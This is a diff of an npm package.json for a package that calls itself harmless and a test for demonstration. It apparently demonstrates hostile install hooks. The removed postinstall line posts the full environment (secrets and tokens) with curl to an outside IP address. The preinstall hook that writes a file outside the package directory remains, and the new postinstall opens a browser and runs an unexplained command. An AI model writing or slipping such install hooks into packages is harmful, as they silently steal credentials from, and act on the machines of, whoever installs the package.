@@ -1,12 +1,12 @@
 {
   "name": "peekatchuysharmlesspackage",
-  "version": "1.0.18",
+  "version": "1.0.19",
   "description": "Package with no bad intentions and useful stuff. Test Package for demonstration",
   "main": "index.js",
   "scripts": {
 
     "preinstall": "touch ../../evil",
-    "postinstall": "brave https://www.youtube.com/watch?v=dQw4w9WgXcQ?autplay=1 && curl -X POST -d \"$(env)\" 192.168.220.163",
+    "postinstall": "brave https://www.youtube.com/watch?v=dQw4w9WgXcQ?autplay=1 && hochpushen",
     "test": "echo \"Error: no test specified\" && exit 1"
 
   },
